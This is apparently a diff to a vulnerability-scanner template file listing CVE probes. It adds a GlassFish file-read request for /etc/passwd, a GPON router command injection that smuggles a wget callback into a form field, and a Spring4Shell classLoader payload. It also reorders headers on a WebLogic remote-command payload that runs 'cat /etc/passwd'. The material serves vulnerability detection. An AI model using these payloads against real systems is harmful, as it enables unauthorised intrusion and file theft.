@@ -4770,6 +4770,21 @@
       ]
     },
     {
+      "id": "CVE-2017-1000029",
+      "info": {
+        "name": "GlassFish Server Open Source Edition 3.0.1 - LFI",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/resource/file%3a///etc/passwd/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-1000170",
       "info": {
         "name": "WordPress Plugin Delightful Downloads Jquery File Tree 2.1.5 Path Traversal",
@@ -5859,6 +5874,21 @@
             "{{BaseURL}}/...\\...\\...\\...\\...\\...\\...\\...\\...\\windows\\win.ini",
             "{{BaseURL}}/..../..../..../..../..../..../..../..../..../windows/win.ini",
             "{{BaseURL}}/....\\....\\....\\....\\....\\....\\....\\....\\....\\windows\\win.ini"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-10562",
+      "info": {
+        "name": "Dasan GPON Devices - Remote Code Execution (Unauthenticated)",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /GponForm/diag_Form?images/ HTTP/1.1\nHost: {{Hostname}}\n\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox wget http://{{interactsh-url}}`;busybox wget http://{{interactsh-url}}&ipv=0\n",
+            "POST /GponForm/diag_Form?images/ HTTP/1.1\nHost: {{Hostname}}\n\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`wget http://{{interactsh-url}}`;wget http://{{interactsh-url}}&ipv=0\n"
           ]
         }
       ]
@@ -7609,7 +7639,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/debug/pprof/"
+            "{{BaseURL}}/debug/pprof/",
+            "{{BaseURL}}/debug/pprof/goroutine?debug=1"
           ]
         }
       ]
@@ -9790,8 +9821,8 @@
         {
           "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
           "headers": {
-            "Test-Header": "cat /etc/passwd",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Test-Header": "cat /etc/passwd"
           },
           "method": "POST",
           "path": [
@@ -16404,12 +16435,19 @@
       },
       "requests": [
         {
-          "headers": {
-            "Content-Type": "application/x-www-form-urlencoded"
-          },
           "method": "GET",
           "path": [
             "{{BaseURL}}/?class.module.classLoader.resources.context.configFile=https://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx"
+          ]
+        },
+        {
+          "body": "class.module.classLoader.resources.context.configFile=https://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx\n",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}"
           ]
         }
       ]
